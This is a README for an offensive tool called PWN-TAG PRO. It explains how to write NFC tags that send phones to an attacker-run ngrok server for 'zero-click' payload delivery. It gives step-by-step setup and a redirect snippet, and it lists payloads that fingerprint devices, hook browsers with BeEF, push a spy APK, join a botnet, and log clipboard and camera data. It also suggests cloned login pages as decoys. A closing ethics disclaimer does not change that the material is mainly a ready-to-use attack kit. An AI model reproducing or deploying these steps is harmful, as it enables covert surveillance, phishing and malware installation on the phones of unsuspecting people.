# PWN-TAG PRO  
_Use with paid ngrok accounts — full zero-click payload delivery_

_"tag to pwn"_ — NFC payload delivery system for social engineering, red team ops, and mobile testing.

PWN-TAG lets you write NFC tags that trigger live payloads on mobile devices — from fingerprinting to botnet enrollment. Built for ethical hackers, educators, defenders, and curious minds.

---

##  What You Need

*  NFC tag stickers (~$10 for 25):  
  https://a.co/d/gl2XRV8

*  NFC writer app (free):  
  https://apps.apple.com/app/id1252962749

*  Debian-based Linux system
  
*  [ngrok account](https://ngrok.com/) with paid plan (static subdomain required)

---

##  Branches

| Branch       | Purpose                                                                 |
|--------------|-------------------------------------------------------------------------|
| `main`       | Free-tier version using randomized ngrok URLs (tap + browser confirm)   |
| `ngrok-pro`  | Paid ngrok version with reserved domains → **zero-click payloads**      |

---

##  Installation (Clone + Setup)

```bash
git clone https://github.com/ekomsSavior/PWN-TAG.git
cd PWN-TAG
````

Switch to the pro branch:

```bash
git checkout ngrok-pro
```

Install Python dependencies:

```bash
sudo apt update
sudo apt install python3 python3-pip -y
pip3 install flask --break-system-packages
```

---

##  ngrok Setup

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
```

Authenticate your account:

```bash
ngrok config add-authtoken <YOUR_NGROK_AUTH_TOKEN>
```

Reserve a static domain like `pwn-tag.ngrok.app` inside your ngrok dashboard.

---

##  Usage (2 Terminal Workflow)

### Terminal 1 — Start Flask Payload + Listener Server

```bash
python3 flask_server.py
```

 This now:

* Serves all payloads (HTML, APK, etc.)
* Handles `/testlog`, `/camlog`, `/cliplog`, etc.
* Runs on port `8080`

---

### Terminal 2 — Start ngrok Tunnel

```bash
ngrok http --domain=pwn-tag.ngrok.app 8080
```

 You’re now live at:

```
https://pwn-tag.ngrok.app
```

---

##  Write Your NFC Tag

In your NFC writer app:

1. Tap **Write**
2. Add Record → **URL**
3. Paste:

```
https://pwn-tag.ngrok.app/payloads/test_shell.html
```

4. Tap to write

Now when someone taps the tag:

* `test_shell.html` loads
* Device fingerprint is POSTed to your listener
* Redirect triggers to any final payload

---

##  Payload Options (Examples)

| Payload               | Path                       | Description                                                |
| --------------------- | -------------------------- | ---------------------------------------------------------- |
| **Test Shell**        | `payloads/test_shell.html` | Logs fingerprint, then redirects to real payload           |
| **Full Beacon Shell** | `payloads/beef_shell.html` | Loads BEEF hook (must run BEEF server separately)          |
| **APK Dropper**       | `payloads/spy.apk`         | Sends APK file directly to Android users                   |
| **Rogue Joiner**      | `payloads/bot_joiner.html` | Simulates Rogue botnet join behavior — JS beacon or loader |

---

##  Swapping Payloads

Edit this in `payloads/test_shell.html`:

```javascript
window.location.href = "https://pwn-tag.ngrok.app/payloads/YOUR_PAYLOAD_HERE";
```

Example:

```javascript
window.location.href = "https://pwn-tag.ngrok.app/payloads/spy.apk";
```

 You do **not** need to reprogram your NFC tag if you’re using a static domain.

---

##  Pro Tips

*  Make multiple redirectors: `redirect_to_apk.html`, `redirect_to_bot.html`, etc.
*  Replace `index.html` with a 403 decoy, fake update screen, or login clone
*  Add geolocation or IP info: use `fetch('https://ipinfo.io/json')`
*  Chain with `clipboard.js`, `camlog`, or `result.js` for layered payloads
*  With static ngrok domains, your tags stay valid forever — just update server logic

---

## 🛡 Ethical Usage

This tool is intended for **educational use, red team simulation, and defense research only.**
Do not deploy it against real targets without consent. You are responsible for your actions.

---

##  Extras Coming Soon

*  `setup_repo.sh` for auto-deployment
*  `payloads/README.md` to explain demo files
*  BEEF hook setup help
*  QR payload variants for phones without NFC

---

Tag smart.
Pwn hard.
— ek0ms
